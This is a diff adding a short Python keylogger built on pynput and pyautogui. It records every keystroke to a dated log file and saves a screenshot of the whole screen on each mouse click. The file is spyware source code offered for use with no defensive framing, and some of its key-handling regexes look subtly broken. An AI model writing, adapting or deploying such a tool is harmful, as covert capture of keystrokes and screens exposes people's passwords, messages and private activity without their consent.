@@ -1,0 +1,61 @@
+from pynput.mouse import Listener as MouseListener
+from pynput.keyboard import Listener as KeyboardListener
+from datetime import datetime
+import re
+import os
+import pyautogui as py
+from pynput.keyboard import Key
+
+dateofDay = datetime.now()
+
+date = dateofDay.strftime("%d-%m")
+
+directoryPath = r"YOU PATH" + date + "/"
+logFile = directoryPath + "Keylogger.log"
+
+delete = Key.delete
+
+
+def on_press(key):
+    key = str(key)
+    key = re.sub(r'\'', '', key)
+    key = re.sub(r'key.space', '', key)
+    key = re.sub(r'key.enter', '\n', key)
+    key = re.sub(r'key.tab', '\t', key)
+    key = re.sub(r'key.backspace', 'delete', key)
+    key = re.sub(r'key.*', '', key)
+
+    with open(logFile, 'a') as log:
+        if key == delete:
+            if os.stat(logFile).st_size != 0:
+                key = re.sub(r'key.backspace', '', key)
+                log.seek(0, 2)
+                character = log.tell()
+                log.truncate(character - 1)
+        else:
+            log.write(key)
+
+
+def on_click(x, y, buttom, pressed):
+    if pressed:
+        myPrint = py.screenshot()
+        hour = datetime.now()
+        hourPrint = hour.strftime("%H-%M-%S")
+        myPrint.save(os.path.join(
+            directoryPath, "printKeylogger" + hourPrint + ".jpg"))
+
+
+try:
+    os.mkdir(directoryPath)
+
+except:
+    pass
+
+
+KeyboardListener = KeyboardListener(on_press=on_press)
+MouseListener = MouseListener(on_click=on_click)
+
+KeyboardListener.start()
+MouseListener.start()
+KeyboardListener.join()
+MouseListener.join()
